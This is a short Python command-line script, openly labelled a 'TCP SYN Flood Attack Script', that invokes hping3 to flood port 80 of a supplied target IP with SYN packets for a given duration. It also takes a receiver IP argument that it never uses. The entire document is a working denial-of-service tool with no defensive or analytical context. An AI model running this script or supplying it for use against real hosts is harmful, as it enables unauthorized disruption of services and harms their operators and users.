#!/usr/bin/env python3

import argparse
import subprocess


def parse_args():
    parser = argparse.ArgumentParser(description="TCP SYN Flood Attack Script")

    parser.add_argument("--target-ip", required=True)
    parser.add_argument("--receiver-ip", required=True)
    parser.add_argument("--duration", type=int, required=True)

    return parser.parse_args()

def flood(target_ip, duration):
    subprocess.run([
        "hping3",
        "-S",
        "--flood",
        "-p", "80",
        "--count", "0",
        target_ip
    ], timeout=duration)


if __name__ == "__main__":
    args = parse_args()
    flood(args.target_ip, args.duration)